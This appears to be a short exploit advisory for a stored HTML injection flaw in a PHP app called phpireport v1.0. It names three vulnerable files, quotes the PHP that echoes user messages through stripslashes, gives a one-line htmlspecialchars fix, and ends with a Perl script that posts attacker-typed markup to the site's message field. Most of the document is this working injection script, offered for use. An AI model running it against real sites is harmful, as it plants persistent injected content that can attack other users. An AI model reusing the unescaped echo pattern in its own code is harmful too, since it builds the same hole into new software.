########################################################################
# Title    = phpireport v1.0 => Remote Html Code injection
# Author   = Or4nG.M4n
# Download = http://garr.dl.sourceforge.net/project/phpireport/phpireport%20v1.0%20alpha%20revision%2025.rar
# Thnks :
# +----------------------------------+
# |   xSs m4n   i-Hmx   h311 c0d3    |
# |   Dr.Bnned ahwak2000 sa^Dev!L    |
# +----------------------------------+
#
#                                    Html injection
# vuln : messages_viewer.php
# vuln : home.php
# vuln : history.php
# code :
#  
#   echo "
#       <li>
#           <div class=&#039;post-details&#039;><div style=&#039;float:left&#039;>user: ".stripslashes($name)."</div> <div style=&#039;float:right&#039;>".$time."</div></div>
#           <br>
#           <div class=&#039;post-details&#039;>".stripslashes($message)."</div>
#       </li>
#   ";
# How i can Fixed ..
# in all vuln file
# Replace : stripslashes => Replace with => htmlspecialchars
# Thnks to All Stupid Coders
#
use LWP::UserAgent;
 
print "Code to inject #";
my $inj = <STDIN>;
chomp $inj;
my $url = &#039;http://localhost/phpireport/index.php&#039;;
 
my $ua       = LWP::UserAgent->new();
my $response = $ua->post( $url, { &#039;message&#039; => $inj } ); # Post <textarea rows=&#039;2&#039; name=&#039;message&#039; id=&#039;name&#039;></textarea>
my $content  = $response->decoded_content();
print "\n done \n";
 
# The End



